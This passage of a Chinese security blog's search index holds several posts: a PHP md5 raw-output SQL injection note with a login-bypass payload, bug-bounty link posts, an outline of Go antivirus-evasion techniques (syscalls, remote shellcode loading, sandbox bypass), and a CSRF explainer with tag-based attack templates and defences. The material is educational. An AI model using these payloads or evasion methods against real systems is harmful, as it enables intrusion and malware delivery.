class="keyword">from</span> user s where password=<span class="string">&#x27;xxxxxx\&#x27; and user=&#x27;</span>xxx<span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204232135110.png" alt="3"></p><p>发现 <strong>md5(128, true)</strong> 最后的结果带有反斜杠。</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user= OR <span class="number">1</span>=<span class="number">1</span><span class="comment">#&amp;passwd=128</span></span><br></pre></td></tr></table></figure><p>带入到数据库查询的语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user s where password=<span class="string">&#x27;v�a�n���l���q��\&#x27; and user=&#x27;</span> OR <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="利用场景：-15"><a href="#利用场景：-15" class="headerlink" title="利用场景："></a>利用场景：</h4><p>CTF遇见过</p><h4 id="修复建议：-16"><a href="#修复建议：-16" class="headerlink" title="修复建议："></a>修复建议：</h4><p>建议在使用 <strong>md5</strong> 函数的时候，不要将 <strong>$raw_output</strong> 字段设置为<strong>true</strong> 。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(二)</title>
      <link href="/2022/04/17/SRC%E5%A7%BF%E5%8A%BF(%E4%BA%8C)/"/>
      <url>/2022/04/17/SRC%E5%A7%BF%E5%8A%BF(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC姿势-二"><a href="#SRC姿势-二" class="headerlink" title="SRC姿势(二)"></a>SRC姿势(二)</h1><p>新增漏洞银行分享和挖百度的大佬的分享</p><p>未来将会收集点国外赏金猎人的思路。</p><p>github地址：<a href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go免杀思路研究</title>
      <link href="/2022/04/16/go%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%A0%94%E7%A9%B6/"/>
      <url>/2022/04/16/go%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="go免杀思路研究"><a href="#go免杀思路研究" class="headerlink" title="go免杀思路研究"></a>go免杀思路研究</h1><p>今天看了几个Go语言的免杀项目，由于这些项目发布已经有些时间了，免杀效果早已大不如前，遂想将这几个项目核心思想结合一下，生成一个新的免杀项目，这里总结一下几个项目的核心思想：</p><ol><li><p>Syscall直接系统调用</p></li><li><p>shellcode远程加载（远程加载图片中的shellcode）</p></li><li><p>shellcode混淆加密（以Base64为例）</p></li><li><p>沙箱绕过</p></li><li><p>随机变量名生成</p><span id="more"></span></li></ol><p>参考的项目如下：</p><p><a href="https://github.com/pureqh/bypassAV">pureqh&#x2F;bypassAV: 免杀shellcode加载器 (github.com)</a></p><p><a href="https://github.com/Hangingsword/HouQing">Hangingsword&#x2F;HouQing (github.com)</a></p><p><a href="https://github.com/huadema/Gobypass">huadema&#x2F;Gobypass (github.com)</a></p><p>目前火绒没绕过去。。。这令我很吃惊，360、def完美落地，火绒我研究一下，源码比较拙劣，先不放了，放张打包成exe后的VT检测图</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204162227082.png"></p>]]></content>
      
      
      <categories>
          
          <category> 免杀研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重新研究一下CSRF的攻击与防御</title>
      <link href="/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
      <url>/2022/04/14/%E9%87%8D%E6%96%B0%E7%A0%94%E7%A9%B6%E4%B8%80%E4%B8%8BCSRF%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p><strong>定义：</strong></p><p>跨站请求伪造</p><p>挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p><span id="more"></span><p><strong>对比XSS：</strong> 跟跨网站脚本(XSS)相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.用户C打开浏览器，访问受信任网站<span class="selector-tag">A</span>，输入用户名和密码请求登录网站<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">2</span>.在用户信息通过验证后，网站<span class="selector-tag">A</span>产生Cookie信息并返回给浏览器，此时用户登录网站<span class="selector-tag">A</span>成功，可以正常发送请求到网站<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">3</span>.用户未退出网站<span class="selector-tag">A</span>之前，在同一浏览器中，打开一个TAB页访问网站<span class="selector-tag">B</span>;</span><br><span class="line"><span class="number">4</span>.网站<span class="selector-tag">B</span>接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点<span class="selector-tag">A</span>;</span><br><span class="line"><span class="number">5</span>.浏览器在接收到这些攻击性代码后，根据网站<span class="selector-tag">B</span>的请求，在用户不知情的情况下携带Cookie信息，向网站<span class="selector-tag">A</span>发出请求。网站<span class="selector-tag">A</span>并不知道该请求其实是由<span class="selector-tag">B</span>发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站<span class="selector-tag">B</span>的恶意代码被执行。</span><br></pre></td></tr></table></figure><p><strong>要被CSRF攻击，必须同时满足两个条件：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 登录受信任网站<span class="selector-tag">A</span>，并在本地生成Cookie。</span><br><span class="line"><span class="number">2</span>. 在不登出<span class="selector-tag">A</span>的情况下，访问危险网站<span class="selector-tag">B</span>。</span><br></pre></td></tr></table></figure><h2 id="GET型CSRF"><a href="#GET型CSRF" class="headerlink" title="GET型CSRF"></a>GET型CSRF</h2><h5 id="乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）"><a href="#乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）" class="headerlink" title="乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）"></a>乌云社区某删除功能存在CSRF漏洞（简单利用需诱骗管理员触发）</h5><p><a href="https://wooyun.website/show.php?uid=S8XttXpbELTcgJTjRpr0Gq6dLdNmnRagM9rJmzPt">https://wooyun.website/show.php?uid=S8XttXpbELTcgJTjRpr0Gq6dLdNmnRagM9rJmzPt</a></p><h5 id="新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）"><a href="#新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）" class="headerlink" title="新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）"></a>新浪微博某处小功能存在CSRF漏洞（可修改用户微博某元素）</h5><p><a href="https://wooyun.website/show.php?uid=6HimWDmTrwk2d0kEhtwey5NJihxQEID4pPWgrsWp">https://wooyun.website/show.php?uid=6HimWDmTrwk2d0kEhtwey5NJihxQEID4pPWgrsWp</a></p><h2 id="POST型CSRF"><a href="#POST型CSRF" class="headerlink" title="POST型CSRF"></a>POST型CSRF</h2><h5 id="中国网络电视台官方CSRF刷微博粉"><a href="#中国网络电视台官方CSRF刷微博粉" class="headerlink" title="中国网络电视台官方CSRF刷微博粉"></a>中国网络电视台官方CSRF刷微博粉</h5><p><a href="https://wooyun.website/show.php?uid=pmxEDefy2wx977fTMeNj9NCHGkxJ5eTMh3pUlXPh">https://wooyun.website/show.php?uid=pmxEDefy2wx977fTMeNj9NCHGkxJ5eTMh3pUlXPh</a></p><h5 id="新浪微博csrf刷粉丝"><a href="#新浪微博csrf刷粉丝" class="headerlink" title="新浪微博csrf刷粉丝"></a>新浪微博csrf刷粉丝</h5><p><a href="https://wooyun.website/show.php?uid=eUTLauXnYMYB2oRcmcV6F4krh3q0HyGJF9IcMnyC">https://wooyun.website/show.php?uid=eUTLauXnYMYB2oRcmcV6F4krh3q0HyGJF9IcMnyC</a></p><h2 id="补充一点东西"><a href="#补充一点东西" class="headerlink" title="补充一点东西"></a>补充一点东西</h2><h4 id="GET-CSRF使用方法"><a href="#GET-CSRF使用方法" class="headerlink" title="GET CSRF使用方法"></a>GET CSRF使用方法</h4><p>GET请求不一定必须限制为FORM表单，JS请求进行提交，img、iframe、link等标签，css属性都可以进行GET请求</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. script标签利用</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;请点击我</span><br><span class="line">2. iframe利用</span><br><span class="line">&lt;iframe <span class="attribute">src</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">3. img标签利用</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>/&gt;</span><br><span class="line">远程加载图片，这个利用点一般在引入远程图片时，例如 头像</span><br><span class="line">4.link标签利用</span><br><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attribute">type</span>=<span class="string">&#x27;text/css&#x27;</span> <span class="attribute">href</span>=<span class="string">&quot;恶意CSRF_URL&quot;</span>&gt;</span><br><span class="line">4. CSS - backgroud利用</span><br><span class="line">利用 CSS中 background样式中的url来加载远程机器上的内容，从而对url中的内容发送HTTP请求</span><br><span class="line">body</span><br><span class="line">&#123;background:url(<span class="string">&quot;恶意CSRF_URL&quot;</span>);&#125;</span><br></pre></td></tr></table></figure><h2 id="CSRF蠕虫"><a href="#CSRF蠕虫" class="headerlink" title="CSRF蠕虫"></a>CSRF蠕虫</h2><h5 id="音悦台一处CSRF（2）-已经证明可构造蠕虫"><a href="#音悦台一处CSRF（2）-已经证明可构造蠕虫" class="headerlink" title="音悦台一处CSRF（2）[已经证明可构造蠕虫]"></a>音悦台一处CSRF（2）[已经证明可构造蠕虫]</h5><p><a href="https://wooyun.website/show.php?uid=0uuWjJIpThFyMfSHQaiWRvV9YutUbbnmD9NAz6MD">https://wooyun.website/show.php?uid=0uuWjJIpThFyMfSHQaiWRvV9YutUbbnmD9NAz6MD</a></p><h2 id="XSS-CSRF组合拳"><a href="#XSS-CSRF组合拳" class="headerlink" title="XSS+CSRF组合拳"></a>XSS+CSRF组合拳</h2><p>普通的CSRF需要诱导受害者点击构造的CSRF连接，但当CSRF与XSS组合之后，就能实现无意识的攻击了</p><h5 id="壹心理存储型XSS-CSRF造成蠕虫攻击"><a href="#壹心理存储型XSS-CSRF造成蠕虫攻击" class="headerlink" title="壹心理存储型XSS+CSRF造成蠕虫攻击"></a>壹心理存储型XSS+CSRF造成蠕虫攻击</h5><p><a href="https://wooyun.website/show.php?uid=wWfl0XRqzAeneYfhEsjb0tmnQ71JE6xqubtOH5kl">https://wooyun.website/show.php?uid=wWfl0XRqzAeneYfhEsjb0tmnQ71JE6xqubtOH5kl</a></p><h2 id="在业界目前防御-CSRF-攻击主要有四种策略"><a href="#在业界目前防御-CSRF-攻击主要有四种策略" class="headerlink" title="在业界目前防御 CSRF 攻击主要有四种策略"></a>在业界目前防御 CSRF 攻击主要有四种策略</h2><ol><li>验证 HTTP Referer 字段；</li><li>在请求地址中添加 token 并验证；</li><li>在 HTTP 头中自定义属性并验证；</li><li>Chrome 浏览器端启用 SameSite cookie</li></ol><p>对于绕过的方法，之后再讲</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC姿势(一)</title>
      <link href="/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/"/>
      <url>/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC姿势-一"><a href="#SRC姿势-一" class="headerlink" title="SRC姿势(一)"></a>SRC姿势(一)</h1><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204141050517.png"></p><p>github地址：<a href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
